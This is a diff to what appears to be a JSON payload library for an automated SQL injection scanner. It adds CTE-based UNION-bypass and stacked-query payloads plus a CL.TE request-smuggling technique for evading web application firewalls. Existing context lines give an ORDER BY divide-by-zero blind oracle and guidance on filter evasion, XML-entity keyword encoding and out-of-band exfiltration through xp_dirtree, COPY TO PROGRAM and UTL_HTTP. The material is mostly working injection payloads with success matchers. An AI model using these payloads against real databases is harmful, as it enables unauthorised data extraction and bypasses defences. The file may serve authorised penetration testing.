@@ -417,7 +417,7 @@
       ]
     },
     "order_by_sink": {
-      "description": "Blind extraction via the ORDER BY / GROUP BY clause as the injection SINK (not column-count enumeration). Applies when the input lands directly inside ORDER BY so quote-breaking and UNION are unavailable — you cannot escape the clause, but you can substitute an expression that branches on a condition. Oracle forms: boolean-blind via a CASE that divides by zero on one branch (visible error only when the branch is taken), error-based CAST of a subselect to int, and time-based PG_SLEEP / SLEEP.",
+      "description": "Blind extraction via the ORDER BY / GROUP BY clause as the injection SINK (not column-count enumeration). Applies when the input lands directly inside ORDER BY so quote-breaking and UNION are unavailable \u2014 you cannot escape the clause, but you can substitute an expression that branches on a condition. Oracle forms: boolean-blind via a CASE that divides by zero on one branch (visible error only when the branch is taken), error-based CAST of a subselect to int, and time-based PG_SLEEP / SLEEP.",
       "tech_match": [
         "PostgreSQL",
         "MySQL",
@@ -439,7 +439,7 @@
       "probes": [
         {
           "payload": "{{baseline}},(SELECT CASE WHEN (1=2) THEN 1 ELSE 1/(SELECT 0) END)",
-          "description": "ORDER BY boolean-blind oracle via division-by-zero: the CASE expression evaluates 1/(SELECT 0) whenever the condition is FALSE, forcing a divide-by-zero DB error. Swap 1=2 for the real condition (e.g. (SELECT SUBSTRING(version(),1,1))='1') — an error means the ELSE branch ran (condition false), a clean sort means the THEN branch ran (condition true). Confirms the ORDER BY sink is injectable when UNION/quote-break are impossible.",
+          "description": "ORDER BY boolean-blind oracle via division-by-zero: the CASE expression evaluates 1/(SELECT 0) whenever the condition is FALSE, forcing a divide-by-zero DB error. Swap 1=2 for the real condition (e.g. (SELECT SUBSTRING(version(),1,1))='1') \u2014 an error means the ELSE branch ran (condition false), a clean sort means the THEN branch ran (condition true). Confirms the ORDER BY sink is injectable when UNION/quote-break are impossible.",
           "matchers": [
             {
               "type": "word",
@@ -554,6 +554,86 @@
           }
         }
       ]
+    },
+    "cte_bypass": {
+      "description": "CTE (Common Table Expression) SQLi \u2014 WITH clause bypasses WAFs that block UNION SELECT. MySQL 8+, PostgreSQL, MSSQL, SQLite 3.8.3+, Oracle.",
+      "tech_match": [
+        "MySQL",
+        "PostgreSQL",
+        "MSSQL",
+        "SQLite",
+        "Oracle"
+      ],
+      "probes": [
+        {
+          "payload": "') UNION SELECT * FROM (WITH t AS (SELECT 1) SELECT * FROM t)x--",
+          "description": "CTE-wrapped UNION bypass \u2014 WAFs that block 'UNION SELECT' may miss 'WITH...AS...SELECT'",
+          "matchers": [
+            {
+              "type": "word",
+              "value": [
+                "syntax error",
+                "SQL",
+                "1"
+              ]
+            }
+          ]
+        },
+        {
+          "payload": "';WITH t AS (SELECT @@version v) SELECT v FROM t--",
+          "description": "CTE stacked query \u2014 extract database version via CTE (MSSQL/MySQL 8+)",
+          "matchers": [
+            {
+              "type": "regex",
+              "value": "\\d+\\.\\d+\\.\\d+"
+            }
+          ]
+        },
+        {
+          "payload": "' UNION WITH t AS (SELECT version()) SELECT * FROM t--",
+          "description": "CTE UNION PostgreSQL \u2014 version extraction via WITH clause",
+          "matchers": [
+            {
+              "type": "word",
+              "value": [
+                "PostgreSQL",
+                "syntax error"
+              ]
+            }
+          ]
+        },
+        {
+          "payload": "';WITH RECURSIVE t(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM t WHERE n<5) SELECT n FROM t--",
+          "description": "Recursive CTE \u2014 generates data without table access, useful for boolean/timing extraction",
+          "matchers": [
+            {
+              "type": "status_not",
+              "value": [
+                200
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    "smuggling_waf_bypass": {
+      "description": "Use CL.TE request smuggling to bypass WAF payload inspection \u2014 the WAF reads Content-Length, the backend reads Transfer-Encoding",
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "CL.TE probe: send Content-Length covering the benign prefix, Transfer-Encoding:chunked with the payload in the smuggled second request. The WAF sees only the clean first request.",
+          "matchers": [
+            {
+              "type": "word",
+              "value": [
+                "error",
+                "syntax",
+                "SQL"
+              ]
+            }
+          ]
+        }
+      ]
     }
   },
   "craft_guidance": [
@@ -565,7 +645,7 @@
     "6. WAF BYPASS CHAIN: Try in order \u2014 inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
     "7. FILTER EVASION: If quotes blocked, use hex (0x61646D696E), CHAR(), or numeric comparison. If spaces blocked, use /**/ or %09 (tab). If keywords blocked, use synonyms (COALESCE vs IF, CASE vs IIF).",
     "8. OOB EXFILTRATION: MySQL LOAD_FILE+INTO OUTFILE, MSSQL xp_dirtree/xp_fileexist to UNC path, PostgreSQL COPY TO PROGRAM, Oracle UTL_HTTP.REQUEST.",
-    "9. XML-ENTITY WAF BYPASS: when the injection point is inside an XML request body (delivery vector: xml_injection.json contexts), encode SQL keywords as decimal (&#83;&#69;&#76;&#69;&#67;&#84; = SELECT) or hex (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;) numeric character references. A WAF inspecting raw bytes never sees the keyword; the XML parser decodes the entities before the value reaches the DB. Encode only the keywords (SELECT/UNION/AND/OR/SLEEP/quote) — the rest can stay literal.",
-    "10. ORDER BY SINK: when input lands directly in ORDER BY you cannot quote-break or UNION. Substitute a branching expression instead — CASE WHEN (cond) THEN 1 ELSE 1/(SELECT 0) END (boolean-blind via divide-by-zero error), CAST((SELECT ...) AS int) (error-based), or (SELECT 1 FROM PG_SLEEP(5)) (time-based). See the order_by_sink context."
+    "9. XML-ENTITY WAF BYPASS: when the injection point is inside an XML request body (delivery vector: xml_injection.json contexts), encode SQL keywords as decimal (&#83;&#69;&#76;&#69;&#67;&#84; = SELECT) or hex (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;) numeric character references. A WAF inspecting raw bytes never sees the keyword; the XML parser decodes the entities before the value reaches the DB. Encode only the keywords (SELECT/UNION/AND/OR/SLEEP/quote) \u2014 the rest can stay literal.",
+    "10. ORDER BY SINK: when input lands directly in ORDER BY you cannot quote-break or UNION. Substitute a branching expression instead \u2014 CASE WHEN (cond) THEN 1 ELSE 1/(SELECT 0) END (boolean-blind via divide-by-zero error), CAST((SELECT ...) AS int) (error-based), or (SELECT 1 FROM PG_SLEEP(5)) (time-based). See the order_by_sink context."
   ]
 }
